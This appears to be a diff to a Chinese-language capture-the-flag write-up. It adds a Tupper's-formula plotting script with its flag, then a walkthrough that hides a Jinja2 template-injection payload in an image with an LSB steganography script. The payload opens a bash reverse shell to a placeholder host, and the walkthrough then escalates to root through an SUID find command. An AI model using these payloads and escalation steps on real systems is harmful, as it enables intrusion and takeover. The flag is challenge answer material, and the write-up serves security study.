@@ -116,3 +116,165 @@ for i in range(0, 136):
    tupper += res  
 print(tupper)
 ```
+
+tupper脚本
+
+```python
+from functools import reduce  
+  
+  
+def Tuppers_Self_Referential_Formula():  
+    k = 1594199391770250354455183081054802631580554590456781276981302978243348088576774816981145460077422136047780972200375212293357383685099969525103172039042888918139627966684645793042724447954308373948403404873262837470923601139156304668538304057819343713500158029312192443296076902692735780417298059011568971988619463802818660736654049870484193411780158317168232187100668526865378478661078082009408188033574841574337151898932291631715135266804518790328831268881702387643369637508117317249879868707531954723945940226278368605203277838681081840279552  
+  
+    # 这里替换为你自己的K值  
+  
+    def f(x, y):  
+        d = ((-17 * x) - (y % 17))  
+        e = reduce(lambda x, y: x * y, [2 for x in range(-d)]) if d else 1  
+        g = ((y // 17) // e) % 2  
+        return 0.5 < g  
+  
+    for y in range(k + 16, k - 1, -1):  
+        line = ""  
+        for x in range(0, 107):  
+            if f(x, y):  
+                line += " ■"  
+            else:  
+                line += "  "  
+        print(line)  
+  
+  
+if __name__ == '__main__':  
+    Tuppers_Self_Referential_Formula()
+```
+
+tupper在线网站
+
+![](attachments/Pasted%20image%2020230427161643.png)
+
+flag{MISC_COOL!}
+
+### LSSTIB
+文件上传 ssti！！！
+
+用最简单的ssti就可以，但是要用lsb隐写
+
+`{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/your-ip/2345 0>&1"').read()}}`
+
+lsb脚本
+
+```python
+# -*- coding: utf-8 -*-
+"""
+Created on Sun May 19 11:20:05 2019
+@author: Administrator
+"""
+
+from PIL import Image
+
+
+def plus(string):
+    # Python zfill() 方法返回指定长度的字符串，原字符串右对齐，前面填充0。
+    return string.zfill(8)
+
+
+def get_key(strr):
+    # 获取要隐藏的文件内容
+    with open(strr, "rb") as f:
+        s = f.read()
+        string = ""
+        for i in range(len(s)):
+         # 逐个字节将要隐藏的文件内容转换为二进制，并拼接起来
+         # 1.先用ord()函数将s的内容逐个转换为ascii码
+         # 2.使用bin()函数将十进制的ascii码转换为二进制
+         # 3.由于bin()函数转换二进制后，二进制字符串的前面会有"0b"来表示这个字符串是二进制形式，所以用replace()替换为空
+         # 4.又由于ascii码转换二进制后是七位，而正常情况下每个字符由8位二进制组成，所以使用自定义函数plus将其填充为8位
+            string = string+""+plus(bin(s[i]).replace('0b', ''))
+    # print(string)
+    return string
+
+
+def mod(x, y):
+    return x % y
+
+# str1为载体图片路径，str2为隐写文件，str3为加密图片保存的路径
+
+
+def func(str1, str2, str3):
+    im = Image.open(str1)
+    # 获取图片的宽和高
+    width, height = im.size[0], im.size[1]
+    print("width:"+str(width))
+    print("height:"+str(height))
+    count = 0
+    # 获取需要隐藏的信息
+    key = get_key(str2)
+    keylen = len(key)
+    for h in range(height):
+        for w in range(width):
+            pixel = im.getpixel((w, h))
+            a = pixel[0]
+            b = pixel[1]
+            c = pixel[2]
+            if count == keylen:
+                break
+            # 下面的操作是将信息隐藏进去
+            # 分别将每个像素点的RGB值余2，这样可以去掉最低位的值
+            # 再从需要隐藏的信息中取出一位，转换为整型
+            # 两值相加，就把信息隐藏起来了
+            a = a-mod(a, 2)+int(key[count])
+            count += 1
+            if count == keylen:
+                im.putpixel((w, h), (a, b, c))
+                break
+            b = b-mod(b, 2)+int(key[count])
+            count += 1
+            if count == keylen:
+                im.putpixel((w, h), (a, b, c))
+                break
+            c = c-mod(c, 2)+int(key[count])
+            count += 1
+            if count == keylen:
+                im.putpixel((w, h), (a, b, c))
+                break
+            if count % 3 == 0:
+                im.putpixel((w, h), (a, b, c))
+    im.save(str3)
+
+
+def main():
+    # 原图
+    old = "flag.png"
+    # 处理后输出的图片路径
+    new = "flag_encode.png"
+    # 需要隐藏的信息
+    enc = "a.txt"
+    func(old, enc, new)
+
+
+if __name__ == '__main__':
+    main()
+
+
+
+```
+
+弹到shell
+
+![](attachments/Pasted%20image%2020230427162734.png)
+
+简单的suid提权
+
+`find / -user root -perm -4000 -print 2>/dev/null`
+
+![](attachments/Pasted%20image%2020230427163443.png)
+
+只有find可以suid提权
+`find . -exec /bin/sh -p \; -quit`
+这里推荐一个网站 [GTFOBins](https://gtfobins.github.io/)
+
+![](attachments/Pasted%20image%2020230427163729.png)
+
+
+## 参考文章
+[(58条消息) VNCTF2023-misc方向wp_ttttototooo的博客-CSDN博客](https://blog.csdn.net/jyttttttt/article/details/129114207)
